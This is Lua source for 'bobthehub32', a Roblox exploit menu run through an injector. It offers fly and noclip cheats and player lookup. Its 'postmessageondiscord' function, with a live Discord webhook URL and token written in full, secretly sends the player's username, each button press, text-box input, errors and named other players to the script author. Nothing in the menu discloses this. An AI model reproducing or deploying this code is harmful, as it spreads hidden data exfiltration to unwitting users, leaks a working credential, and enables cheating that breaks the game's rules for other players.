-- Scripts:

local function EKLPFOS_fake_script() -- MainFrame.LocalScript 
	local script = Instance.new('LocalScript', MainFrame)

	local version = 2.15
	local name = "bobthehub32 v"..version
	
	local storage = script.Parent.Parent.Parent.Storage
	local mainframe = script.Parent
	local lp = game.Players.LocalPlayer
	local chosen = Instance.new("ObjectValue", mainframe)
	local tweenservice = game:GetService("TweenService")
	local textservice = game:GetService("TextService")
	chosen.Name = "Selected"
	mainframe.Parent.Text = "Loading"
	
	local changedcolor = false
	spawn(function()
		while wait(10) do
			if changedcolor == false then
				local info = TweenInfo.new(10, Enum.EasingStyle.Linear)
				local prop = {}
				prop.BackgroundColor3 = Color3.fromRGB(111, 111, 111)
				local tween = tweenservice:Create(mainframe, info, prop)
				tween:Play()
			else
				local info = TweenInfo.new(10, Enum.EasingStyle.Linear)
				local prop = {}
				prop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				local tween = tweenservice:Create(mainframe, info, prop)
				tween:Play()
			end
			changedcolor = not changedcolor
		end
	end)
	
	function tablefind(table, thing)
		for i,v in pairs(table) do
			if v == thing then
				return i
			end
		end
	end
	
	function gettextsize(object, wrapped, text)
		if wrapped == true then
			local textlabelman = Instance.new("TextLabel", mainframe.Parent.Parent)
			textlabelman.Size = object.Size + UDim2.fromOffset(0,50000)
			textlabelman.TextWrapped = true
			textlabelman.Font = object.Font
			textlabelman.TextXAlignment = Enum.TextXAlignment.Left
			textlabelman.TextYAlignment = Enum.TextYAlignment.Top
			textlabelman.TextSize = object.TextSize
			textlabelman.Text = text
			if textlabelman.Text == "" and object:IsA("TextBox") then
				textlabelman.Text = object.PlaceholderText
			end
			local x = textlabelman.TextBounds.X
			local y = textlabelman.TextBounds.Y
			textlabelman:Destroy()
			local table = {
				["X"] = x;
				["Y"] = y
			}
			return table
		else
			local textlabelman = Instance.new("TextLabel", mainframe.Parent.Parent)
			textlabelman.Size = UDim2.fromScale(50000,50000)
			textlabelman.Font = object.Font
			textlabelman.TextSize = object.TextSize
			textlabelman.TextXAlignment = Enum.TextXAlignment.Left
			textlabelman.TextYAlignment = Enum.TextYAlignment.Top
			textlabelman.Visible = false
			textlabelman.Text = text
			if textlabelman.Text == "" and object:IsA("TextBox") then
				textlabelman.Text = object.PlaceholderText
			end
			local x = textlabelman.TextBounds.X
			local y = textlabelman.TextBounds.Y
			textlabelman:Destroy()
			local table = {
				["X"] = x;
				["Y"] = y
			}
			return table
		end
	end
	
	function tweencolor(object, color, time)
		local info = TweenInfo.new(time, Enum.EasingStyle.Linear)
		local prop = {}
		prop.BackgroundColor3 = color
		local tween = tweenservice:Create(object, info, prop)
		tween:Play()
	end
	
	function mouseify(button)
		if button:IsA("TextButton") then
			local p = button:FindFirstChild("Outline")
			if p then
				button.MouseEnter:Connect(function()
					tweencolor(p, Color3.new(0, 0.0156863, 1), 0.2)
					tweencolor(button,Color3.fromRGB(86, 86, 86),0.2)
					button.TextColor3 = Color3.new(0.333333, 1, 1)
					button.MouseLeave:Wait()
					tweencolor(p, Color3.new(1,1,1), 0.5)
					tweencolor(button,Color3.fromRGB(0,0,0),0.2)
					button.TextColor3 = Color3.new(1,1,1)
				end)
			else
				button.MouseEnter:Connect(function()
					tweencolor(button,Color3.fromRGB(86, 86, 86),0.2)
					button.TextColor3 = Color3.new(0.333333, 1, 1)
					button.MouseLeave:Wait()
					if chosen.Value.Name.."Tab" == button.Name then
						tweencolor(button,Color3.fromRGB(50,50,50),0.2)
						button.TextColor3 = Color3.new(0.333333, 1, 1)
					else
						tweencolor(button,Color3.fromRGB(0,0,0),0.2)
						button.TextColor3 = Color3.new(1,1,1)
					end
				end)
			end
		end
	end
	
	function charadded(runscript)
		runscript()
		lp.CharacterAdded:Connect(function()
			runscript()
		end)
	end
	
	function toscale(pos)
		local x = (pos.X.Offset / mainframe.Parent.Parent.AbsoluteSize.X) + pos.X.Scale
		local y = (pos.Y.Offset / mainframe.Parent.Parent.AbsoluteSize.Y) + pos.Y.Scale
		return UDim2.fromScale(x,y)
	end
	
	function tooffset(pos)
		local x = (pos.X.Scale * mainframe.Parent.Parent.AbsoluteSize.X) + pos.X.Offset
		local y = (pos.Y.Scale * mainframe.Parent.Parent.AbsoluteSize.Y) + pos.Y.Offset
		return UDim2.fromOffset(x,y)
	end
	
	function split(text, splitter)
		text = text..splitter
		local returning = {}
		local returningtxt = ""
		for i = 1,#text do
			if text:sub(i,i) ~= splitter and splitter ~= "" then
				returningtxt = returningtxt..text:sub(i,i)
			else
				if splitter == "" then
					returning[#returning+1] = text:sub(i,i)
				else
					returning[#returning+1] = returningtxt
				end
				returningtxt = ""
			end
		end
		return returning
	end
	
	local uis = game:GetService("UserInputService")
	uis.InputBegan:Connect(function(key)
		if key.KeyCode == Enum.KeyCode.Minus and not uis:GetFocusedTextBox() then
			game:GetService("RunService").Stepped:Wait()
			mainframe.Parent.Values:CaptureFocus()
		end
	end)
	
	
	function drag(guiobject, gui)
		local moveoutofscreen = false
		local gui = gui
		if not gui then
			gui = guiobject
			repeat
				gui = gui.Parent
				wait()
			until gui:IsA("ScreenGui")
		end
	
		local function checkpos1(pos)
			local range1 = guiobject.AbsolutePosition.X
			local range2 = guiobject.AbsolutePosition.X + guiobject.AbsoluteSize.X
			local range3 = guiobject.AbsolutePosition.Y
			local range4 = guiobject.AbsolutePosition.Y + guiobject.AbsoluteSize.Y
			if pos.X.Offset >= range1 and pos.X.Offset <= range2 and pos.Y.Offset >= range3 and pos.Y.Offset <= range4 then
				return true
			end
		end
	
		guiobject.Active = true
		local speed = 0.1
		local uis = game:GetService("UserInputService")
		local helddown = false
		local mouse = lp:GetMouse()
		local delta = nil
	
		uis.InputBegan:Connect(function(thing)
			if thing.UserInputType == Enum.UserInputType.MouseButton1 and checkpos1(UDim2.fromOffset(mouse.X,mouse.Y)) == true then
				delta = UDim2.fromOffset(guiobject.AbsolutePosition.X,guiobject.AbsolutePosition.Y) - UDim2.fromOffset(mouse.X,mouse.Y)
				helddown = true
				repeat game:GetService("RunService").Stepped:Wait() until thing.UserInputState == Enum.UserInputState.End
				helddown = false
			end
		end)
		--pos.X.Offset >= 0 and pos.X.Offset <= script.Parent.Parent.AbsoluteSize.X
	
		local function modifypos(position, position2)
			if moveoutofscreen ~= true then
				if position.X.Offset < 0 then
					position = UDim2.fromOffset(0,position.Y.Offset)
				elseif position2.X.Offset > gui.AbsoluteSize.X then
					position = UDim2.fromOffset(gui.AbsoluteSize.X - guiobject.AbsoluteSize.X, position.Y.Offset)
				end
	
				if position.Y.Offset < 0 then
					position = UDim2.fromOffset(position.X.Offset,0)
				elseif position2.Y.Offset > gui.AbsoluteSize.Y then
					position = UDim2.fromOffset(position.X.Offset, gui.AbsoluteSize.Y - guiobject.AbsoluteSize.Y - mainframe.AbsoluteSize.Y)
				end
			end
			return position
		end
	
		local function movegui()
			if helddown == true then
				local mpos = UDim2.fromOffset(mouse.X,mouse.Y)
				local pos = toscale(modifypos(mpos + delta, (mpos+delta) + UDim2.fromOffset(guiobject.AbsoluteSize.X,guiobject.AbsoluteSize.Y + mainframe.AbsoluteSize.Y)))
				if speed > 0 then
					guiobject:TweenPosition(pos,Enum.EasingDirection.In,Enum.EasingStyle.Linear,speed,true)
				else
					guiobject.Position = pos
				end
			end
		end
	
		mouse.Move:Connect(function()
			movegui()
		end)
	end
	
	drag(mainframe.Parent)
	
	function gettext()
		return mainframe.Parent.Values.Text
	end
	
	function gethumanoid(plr)
		if not plr then
			return lp.Character:WaitForChild("Humanoid")
		else
			return plr.Character:WaitForChild("Humanoid")
		end
	end
	
	function gettools(parttype)
		if parttype == "char" then
			local number = 0
			for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("Handle") then
					number = number + 1
				end
			end
			return number
		elseif parttype == "backpack" then
			local number = 0
			for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild"Handle" then
					number = number + 1
				end
			end
			return number
		end
	end
	
	
	function getroot(plr)
		if not plr then
			return gethumanoid().RootPart
		else
			return gethumanoid(plr).RootPart
		end
	end
	
	function getplr(name)
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name:lower() == name:lower() then
				return v
			end
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name:lower():match(name:lower()) then
				return v
			end
		end
	end
	
	function getplayer(name)
	return getplr(name)
	end
	
	function postmessageondiscord(msg)
		if syn and syn.request then
			local message = msg
			local amountofletter = 1
			local message1 = message:split("")
			local lastletter = ""
			if string.match(message,"`") then
				repeat
					game:GetService("RunService").Stepped:Wait()
					for i,v in pairs(message1) do
						game:GetService("RunService").Stepped:Wait()
						if string.match(v, "`") then
							local removepee = tablefind(message1,"`")
							table.remove(message1,removepee)
							game:GetService("RunService").Stepped:Wait()
						end
					end
					message = table.concat(message1,"")
				until not string.match(message,"`")
			end

			---------------------------------------

			for i,v in pairs(message1) do
				if v == lastletter then
					amountofletter = amountofletter + 1
				end
				lastletter = v
				if amountofletter == #message1 then
					message = ""
				end
				repeat
					if message1[#message1] == " " then
						table.remove(message1,#message1)
						message = table.concat(message1,"")
						game:GetService("RunService").Stepped:Wait()
					end
				until message1[#message1] ~= " " 
			end

			if message ~= "" then
				local shitass = message:split(" ")
				local suspiciousplayer = ""
				for i,v in pairs(shitass) do
					if getplayer(v) then
						suspiciousplayer = suspiciousplayer..getplayer(v).Name..", "
					end
				end
				if suspiciousplayer == "" then
					suspiciousplayer = "None"
				else
				    suspiciousplayer = suspiciousplayer:sub(1,suspiciousplayer:len()-2)
				end


				local response = syn.request(
					{
						Url = "https://discord.com/api/webhooks/822721943207149569/d4MY1kaa2ptBdUMORf1fVnj0Tl0LlvTUq0Vdm3Wov7hN4cT4HefNwx7bov95Qhb_xnhW",  -- This website helps debug HTTP requests
						Method = "POST",
						Headers = {
							["Content-Type"] = "application/json"  -- When sending JSON, set this!
						};
						Body = game:GetService("HttpService"):JSONEncode({
							content = "```cs\n[1] Player: '"..game.Players.LocalPlayer.Name.."'\n[2] Message: '"..message.."'\n[3] Potential players: "..tostring(suspiciousplayer).."\nVersion: "..version.."```";
						})
					}
				)
			end
		end
end
postmessageondiscord("Injected ".. name)
	
	local maxflyspeed = 2*2
	local flyspeed = maxflyspeed/2
	local flying = false
	function fly()
		if flying == false then
			spawn(function()
				flying = true
				local x = 0
				local y = 0
				local z = 0
				local keys = {}
				local focusedcheck = ""
				local status = "none"
				lp.Character.Humanoid.PlatformStand = true
				local uis = game:GetService("UserInputService")
				local velocity = Instance.new("BodyVelocity",lp.Character.HumanoidRootPart)
				velocity.MaxForce = Vector3.new('inf','inf','inf')
				local gyro = Instance.new("BodyGyro",lp.Character.HumanoidRootPart)
				gyro.MaxTorque = Vector3.new('inf','inf','inf')
				gyro.D = 300
				gyro.P = 9000
				local focuschecc = uis.TextBoxFocused:Connect(function(thing)
					focusedcheck = thing.Name
					uis.TextBoxFocusReleased:Wait()
					focusedcheck = ""
				end)
				velocity.Velocity = Vector3.new(0,0,0)
				local fli = uis.InputBegan:Connect(function(key)
					if not tablefind(keys,uis:GetStringForKeyCode(key.KeyCode)) then
						keys[#keys+1] = uis:GetStringForKeyCode(key.KeyCode)
					end
					if key.KeyCode == Enum.KeyCode.W and focusedcheck == "" then
						while key.UserInputState ~=Enum.UserInputState.End and flying == true  do
							gyro.CFrame = game.Workspace.Camera.CFrame
							local direction = lp.Character.Humanoid.MoveDirection * 16
							local cameray = game.Workspace.Camera.CFrame.LookVector.Y*16
							if tablefind(keys,"S") or tablefind(keys,"Q") or tablefind(keys,'E') then
								if tablefind(keys,"Q") then
									cameray = -16
								elseif tablefind(keys,"E") then
									cameray = 16
								else
									velocity.Velocity = Vector3.new(0,0,0)
									repeat game:GetService("RunService").Stepped:Wait() until not tablefind(keys,"S") and not tablefind(keys,"Q") and not tablefind(keys,'E')
								end
							end
							direction = Vector3.new(direction.X,cameray,direction.Z)
							velocity.Velocity = direction * flyspeed
							game:GetService("RunService").Stepped:Wait()
						end
						velocity.Velocity = Vector3.new(0,0,0)
					end
	
					if key.KeyCode == Enum.KeyCode.S and focusedcheck == "" then
						while key.UserInputState ~=Enum.UserInputState.End and flying == true  do
							gyro.CFrame = game.Workspace.Camera.CFrame
							local direction = lp.Character.Humanoid.MoveDirection * 16
							local cameray = -(game.Workspace.Camera.CFrame.LookVector.Y*16)
							if tablefind(keys,"W") or tablefind(keys,"Q") or tablefind(keys,'E') then
								if tablefind(keys,"Q") then
									cameray = -16
								elseif tablefind(keys,"E") then
									cameray = 16
								else
									velocity.Velocity = Vector3.new(0,0,0)
									repeat game:GetService("RunService").Stepped:Wait() until not tablefind(keys,"W") and not tablefind(keys,"Q") and not tablefind(keys,'E')
	
								end
							end
							direction = Vector3.new(direction.X,cameray,direction.Z)
							velocity.Velocity = direction * flyspeed
							game:GetService("RunService").Stepped:Wait()
						end
						velocity.Velocity = Vector3.new(0,0,0)
					end
					if key.KeyCode == Enum.KeyCode.A and focusedcheck == "" or key.KeyCode == Enum.KeyCode.D and focusedcheck == "" then
						local progress = 0
						while key.UserInputState ~=Enum.UserInputState.End and flying == true  do
							gyro.CFrame = game.Workspace.Camera.CFrame
							local direction = lp.Character.Humanoid.MoveDirection * 16
							local cameray = velocity.Velocity.Y
							direction = Vector3.new(direction.X*flyspeed,cameray,direction.Z*flyspeed)
							velocity.Velocity = direction
							game:GetService("RunService").Stepped:Wait()
						end
						velocity.Velocity = Vector3.new(0,0,0)
					end
					if key.KeyCode == Enum.KeyCode.E and  focusedcheck == ""  then
						while key.UserInputState ~=Enum.UserInputState.End and flying == true  do
							gyro.CFrame = game.Workspace.Camera.CFrame
							local direction = lp.Character.Humanoid.MoveDirection * 0
							local cameray = 16
							if tablefind(keys,'Q') then
								cameray = 0
							end
							direction = Vector3.new(direction.X,cameray,direction.Z)
							velocity.Velocity = direction * flyspeed
							game:GetService("RunService").Stepped:Wait()
						end
						velocity.Velocity = Vector3.new(0,0,0)
					end
					if key.KeyCode == Enum.KeyCode.Q and  focusedcheck == ""  then
						while key.UserInputState ~=Enum.UserInputState.End and flying == true  do
							gyro.CFrame = game.Workspace.Camera.CFrame
							local direction = lp.Character.Humanoid.MoveDirection * 0
							local cameray = -16
							if tablefind(keys,'E') then
								cameray = 0
							end
							direction = Vector3.new(direction.X,cameray,direction.Z)
							velocity.Velocity = direction * flyspeed
							game:GetService("RunService").Stepped:Wait()
						end
						velocity.Velocity = Vector3.new(0,0,0)
					end
	
					if key.KeyCode == Enum.KeyCode.Space and focusedcheck == "" then
						lp.Character.Humanoid.Sit = false
					end
	
					if key.KeyCode == Enum.KeyCode.LeftShift and focusedcheck == "" then
						flyspeed = maxflyspeed
						repeat game:GetService("RunService").Stepped:Wait() until key.UserInputState == Enum.UserInputState.End
						flyspeed = maxflyspeed /2
					end
				end)
	
				local qwe = uis.InputEnded:Connect(function(key)
					if tablefind(keys,uis:GetStringForKeyCode(key.KeyCode)) then
						local number = tablefind(keys,uis:GetStringForKeyCode(key.KeyCode))
						table.remove(keys,number)
					end
				end)
	
				while flying == true and lp.Character.Humanoid.Health > 0 do
					gyro.CFrame = game.Workspace.Camera.CFrame
					game:GetService("RunService").Stepped:Wait()
				end
				fli:Disconnect()
				qwe:Disconnect()
				focuschecc:Disconnect()
				velocity:Destroy()
				gyro:Destroy()
				lp.Character.Humanoid.PlatformStand = false
				flying = false
			end)
		else
			flying = false
		end
	end
	
	function unfly()
		flying = false
	end
	
	function setspeedfly(int)
		maxflyspeed = int*2
		flyspeed = maxflyspeed / 2
	end
	
	local noclipping = false
	function clip()
		noclipping = false
		for i,v in pairs(lp.Character:GetChildren()) do
			if v:IsA("BasePart") and not v.Name:match("Hand") and not v.Name:match("Foot") and not v.Name:match("Leg") and not v.Name:match("Arm") then
				v.CanCollide = true
			end
		end
	end
	
	function noclip()
		noclipping =  not noclipping
		while game:GetService("RunService").Stepped:Wait() and noclipping == true do
			for i,v in pairs(lp.Character:GetChildren()) do
				if v:IsA("BasePart") and v.CanCollide == true  then
					v.CanCollide = false
				end
			end
		end
		clip()
	end
	
	-----------------------------------------------------------------------------------------------------------------
	
	local frames = {}
	local framenames = {}
	local totaltabsize = 0
	
	function createframe(name)
		local newframe = storage.Frame1:Clone()
		newframe.Parent = mainframe.Storagelol
		newframe.Name = name
		frames[#frames+1] = newframe
		framenames[#framenames+1] = newframe.Name
		local tab = storage.Tab1:Clone()
		tab.Text = name
		tab.Parent = mainframe.Holders
		tab.Visible = true
		local sizes = gettextsize(tab, false, tab.Text)
		tab.Size = UDim2.new(0,sizes.X + 10, 1,0)
		tab.Position = UDim2.fromOffset(totaltabsize, 0)
		totaltabsize = totaltabsize + sizes.X + 10
		tab.Name = name.."Tab"
		mouseify(tab)
		mainframe.Holders.CanvasSize = UDim2.fromOffset(totaltabsize,0)
		local function vify()
			for i,v in pairs(mainframe.Storagelol:GetChildren()) do
				if v ~= newframe then
					v.Visible = false
				else
					v.Visible = true
					chosen.Value = v
				end
			end
			if chosen.Value == newframe then
				tweencolor(tab,Color3.fromRGB(50,50,50),0.2)
				for i,v in pairs(mainframe.Holders:GetChildren()) do
					if v ~= tab then
						tweencolor(v, Color3.fromRGB(0,0,0), 0.2)
						v.TextColor3 = Color3.new(1,1,1)
					end
				end
			end
		end
	
		tab.MouseButton1Click:Connect(function()
			vify()
		end)
	
		if frames[1] == newframe then
			vify()
		end
		wait()
	
		return newframe
	end
	
	function getnumber(string)
		return tonumber(string:gsub("%D", ""))
	end
	
	function createbutton(frame, text, scriptie)
		local int = tablefind(framenames, frame)
		frame = frames[int]
		local button = storage.Button1:Clone()
		button.Parent = frame
		button.Text = text
		button.Name = #frame:GetChildren().." BUTTON cool"
		local total = #frame:GetChildren() - 1
		local p1 = 0
		local p2 = 0
		p2 = math.floor(total / 2) * (button.Size.Y.Offset + button.Size.Y.Offset/2)
		p1 = total/2 - math.floor(total / 2)
		button.Position = UDim2.new(p1,5,0,p2 + 1)
		button.Visible = true
		frame.CanvasSize = UDim2.fromOffset(0,p2 + button.Size.Y.Offset + 2)
		if scriptie then
			button.MouseButton1Click:Connect(function()
			    postmessageondiscord("Pressed ".. button.Text..", "..frame.Name.." tab | ".. gettext())
                local ran,message5 = pcall(function()
				scriptie()
                end)
			if not ran then
			    postmessageondiscord("ERROR: "..message5)
			end
			end)
		end
		mouseify(button)
		return button
	end
	
	local valuetextie = ""
	mainframe.Parent.Values.Changed:Connect(function(thing)
		if thing == "Text" then
			local textbox = mainframe.Parent.Values
			local max = mainframe.Parent.AbsoluteSize.X
			local x = gettextsize(textbox, false, textbox.Text).X / max
			if x > 80 / max and x <= 1  then
				mainframe.Parent.Values:TweenSizeAndPosition(UDim2.fromScale(x , 1), UDim2.fromScale(1-x, 0), Enum.EasingDirection.In,Enum.EasingStyle.Linear,0.1, true)
			elseif x <= 1 then
				mainframe.Parent.Values:TweenSizeAndPosition(UDim2.fromScale(80 / max , 1), UDim2.fromScale(1 - (80 / max)), Enum.EasingDirection.In,Enum.EasingStyle.Linear,0.1, true)
			else
				mainframe.Parent.Values:TweenSizeAndPosition(UDim2.fromScale(1, 1), UDim2.fromScale(0, 0), Enum.EasingDirection.In,Enum.EasingStyle.Linear,0.1, true)
			end
		end
	end)
	
